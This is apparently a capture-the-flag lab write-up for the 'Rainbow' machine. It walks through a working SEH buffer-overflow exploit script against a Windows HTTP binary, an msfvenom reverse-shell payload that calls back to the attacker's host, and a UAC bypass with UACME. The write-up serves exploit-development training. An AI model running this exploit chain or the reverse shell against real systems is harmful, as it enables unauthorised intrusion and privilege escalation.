# Rainbow
![](images/rainbow.png)

IP: `10.10.111.194`


# Outline
This is a bit different to the other boxes and instead focuses on binary exploitation. We are given a simple POC to crash the application:
```
#!/usr/bin/python
from pwn import *
from urllib import parse
from time import sleep
from sys import argv,exit
from os import system
  
HOST = b""
PORT = 8080
 
buffer = b"A"*900
content = buffer
payload =  b"POST / HTTP/1.1\r\n"
payload += b"Host: %s\r\n" % HOST
payload += b"Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0\r\n"
payload += b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
payload += b"Content-Type: application/x-www-form-urlencoded\r\n"
payload += b"Content-Length: %d\r\n\r\n" % len(content)
payload += content

p = remote(HOST, PORT)
p.send(payload)
p.close()
```

# Recon
Nmap scan:
```
Nmap scan report for 10.10.111.194
Host is up (0.28s latency).
Not shown: 993 filtered tcp ports (no-response)
PORT     STATE SERVICE
21/tcp   open  ftp
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
8080/tcp open  http-proxy
```

FTP has anonymous auth, logging in shows the rainbow.exe binary.

# Binary Exploitation
I'm going to copy the binary across to a windows machine and set up a debugger so we can analyse and debug crashes.

With this done firing off the POC from above gives:
```
(28a0.2304): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=fffffffc ebx=004e16b0 ecx=41414141 edx=00000004 esi=004020c0 edi=004e16b0
eip=00406156 esp=007ef8c4 ebp=007ef8d4 iopl=0         nv up ei ng nz na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010286
Rainbow+0x6156:
00406156 8b1401          mov     edx,dword ptr [ecx+eax] ds:002b:4141413d=????????
```

As eip / esp are not smashed, thinking it might be SEH:
```
0:001> !exchain
007ef8e4: Rainbow+a040 (0040a040)
007ef924: Rainbow+a040 (0040a040)
007efbe4: 41414141
Invalid exception stack at 41414141
```

Yep.

Before finding the offset, we should check the protections of the binary:
```
binary-security-check ~/vulnlab/rainbow/rainbow.exe 
/home/eljay/vulnlab/rainbow/rainbow.exe: !CHECKSUM !DATA-EXEC-PREVENT !RUNS-IN-APP-CONTAINER +CONSIDER-MANIFEST !VERIFY-DIGITAL-CERT !CONTROL-FLOW-GUARD !HANDLES-ADDR-GT-2GB !ASLR !SAFE-SEH
```

No ASLR or DEP, so we can just use a simple `pop pop ret;` and execute shellcode on the stack.

We should also consider bad bytes. As this is a POST request, `0x00, 0x0d, 0x0a` wont be valid.

## SEH Offset

Updating the script to use a cyclic pattern for the body instead of A's
```
max_buf = 0x384
 
body = pwn.util.cyclic.cyclic_metasploit(max_buf)

payload =  b"POST / HTTP/1.1\r\n"
payload += b"Host: %s\r\n" % HOST
payload += b"Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0\r\n"
payload += b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
payload += b"Content-Type: application/x-www-form-urlencoded\r\n"
payload += b"Content-Length: %d\r\n\r\n" % len(body)
payload += body 
```

Recrashing the application shows the NSEH record is now `0x77413177`

Validating the offset is right:
```
max_buf = 0x384
 
body = pwn.util.cyclic.cyclic_metasploit(max_buf)
deref_off = pwn.util.cyclic.cyclic_metasploit_find(0x77413177)

body = b"A"*deref_off
body += b"B"*4
body += b"C"*4
body += b"D" * (max_buf - len(body))
```

So the NSEH record should be BBBB
```
0:003> !exchain
009ef8e4: Rainbow+a040 (0040a040)
009ef924: Rainbow+a040 (0040a040)
009efbe4: 42424242
Invalid exception stack at 41414141
```

Nice!

# Redirecting Execution
Checking for PPRs with ropper:
```
ropper -f rainbow.exe --ppr
POP;POP;RET Instructions
========================
0x004091b7: pop edi; pop esi; ret; 
0x004092ad: pop ecx; pop ebp; ret; 
0x004094d8: pop ecx; pop ecx; ret; 
0x00409569: pop esi; pop ebp; ret; 
0x00409657: pop esi; pop ebp; ret; 
0x00409add: pop esi; pop ebx; ret; 
0x00409b09: pop esi; pop ebx; ret; 
0x00409b81: pop esi; pop ebp; ret; 
```

All the gadgets start with a `0x00` which means we wont be able to use anything after this gadget. For now we can see where we land, and potentially use a `jmp` to go back to the start of the buffer, where the shellcode has already been written.
```
max_buf = 0x384
 
body = pwn.util.cyclic.cyclic_metasploit(max_buf)
deref_off = pwn.util.cyclic.cyclic_metasploit_find(0x77413177)
ppr = 0x00409569 #pop esi; pop ebp; ret; 

body = pwn.util.cyclic.cyclic_metasploit(deref_off)
#body = b"A"*deref_off
body += pwn.p32(ppr)
body += b"C"*4
body += b"D" * (max_buf - len(body))
```

After the PPR `eip` is at `0x9efbe4` while the top of our input buffer is at `0x9ef950`, so a jump of `0x294` would place `eip` at the top of the stack.
```
max_buf = 0x384
 
body = pwn.util.cyclic.cyclic_metasploit(max_buf)
deref_off = pwn.util.cyclic.cyclic_metasploit_find(0x77413177)
ppr = 0x00409569 #pop esi; pop ebp; ret; 

body = pwn.util.cyclic.cyclic_metasploit(deref_off)
eip_off = pwn.util.cyclic.cyclic_metasploit_find(0x41307741)

body = b"A"*eip_off
body += b"B"*4
body += b"A"*(deref_off - len(body))
body += pwn.p32(ppr)
body += b"C"*4
body += b"D" * (max_buf - len(body))
```

Running the above shows that we only have 4 btyes to do the `jmp` 
```
41414141 000000C8 41414141 41414141
41414141 42424242 00409569 00000005
```

What we can do is a short jump "back" 12 to the start of the `0x41`'s then a jump to the top of the buffer.
```
body = b"A"*(eip_off -12)
body += b"\xE9\x73\xFD\xFF\xFF"
body += b"\x90\x90\x90"
body += b"\x90\x90\x90\x90"

body += b"\xEB\xF2\x90\x90"
body += b"A"*(deref_off - len(body))
body += pwn.p32(ppr)
body += b"C"*4
body += b"D" * (max_buf - len(body))
```

This puts us back at the top of the payload leaving 624 bytes for a shell.
# Testing against target

Using msfvenom:
```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.253 LPORT=9001 -f raw -o payload.bin -b '\x00\x0a\x0d'
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Saved as: payload.bin
```

prepending the payload and running it gives a shell!
```
def payload():
    with open("./payload.bin", "rb") as f:
        return f.read()

max_buf = 0x384
 
body = pwn.util.cyclic.cyclic_metasploit(max_buf)
deref_off = pwn.util.cyclic.cyclic_metasploit_find(0x77413177)
ppr = 0x00409569 #pop esi; pop ebp; ret; 

body = pwn.util.cyclic.cyclic_metasploit(deref_off)
eip_off = pwn.util.cyclic.cyclic_metasploit_find(0x41307741)

body = payload()
body += b"A"*(eip_off -12 - len(body))
body += b"\xE9\x73\xFD\xFF\xFF" # jmp 0xfffffd78
body += b"\x90\x90\x90"
body += b"\x90\x90\x90\x90"

body += b"\xEB\xF2\x90\x90" # jmp short 0xfffffff4
body += b"A"*(deref_off - len(body))
body += pwn.p32(ppr)
body += b"C"*4
body += b"D" * (max_buf - len(body))
```

Now to test it against the target.
Swapping out the shellcode and IP, and it works!!

# Root
Looking at the users groups:

```
... snip ..
BUILTIN\Administrators                                        Alias            S-1-5-32-544 Group used for deny only                          
... snip ...
Mandatory Label\Medium Mandatory Level                        Label            S-1-16-8192
```

We are a member of administrators but not in a high integrity process. Going to run https://github.com/hfiref0x/UACME to bypass UAC
```
C:\Windows\Tasks>.\akagi64.exe 61 C:\Windows\Tasks\shell.exe
.\akagi64.exe 61 C:\Windows\Tasks\shell.exe
```

Now we are in a high integrity process.


Fin.
